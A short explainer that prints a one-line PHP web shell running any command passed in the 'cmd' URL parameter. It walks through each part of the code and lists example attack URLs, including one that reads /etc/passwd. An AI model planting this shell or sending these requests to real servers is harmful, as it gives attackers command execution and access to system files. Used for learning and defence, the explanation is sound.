## init

```php
<?php
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
?>
```

This is a PHP web shell - a simple but dangerous piece of code that creates a backdoor on a web server. Here's what each part does:

`<?php ... ?>` - Standard PHP opening and closing tags that tell the server to execute the code as PHP.

`$_GET['cmd']` - This retrieves a parameter called 'cmd' from the URL query string. For example, if someone visits http://example.com/shell.php?cmd=ls, it would capture "ls".

`shell_exec()` - This PHP function executes the command on the server's operating system and returns the output as a string.

`echo "<pre>" ... "</pre>";` - This displays the command output in HTML <pre> tags, which preserves formatting like spaces and line breaks, making terminal output readable in a browser`

How it works:
If this code is saved as a file (like shell.php) on a web server, an attacker could execute system commands by visiting URLs like:

http://target.com/shell.php?cmd=whoami (shows current user)
http://target.com/shell.php?cmd=ls -la (lists files)
http://target.com/shell.php?cmd=cat /etc/passwd (reads system files)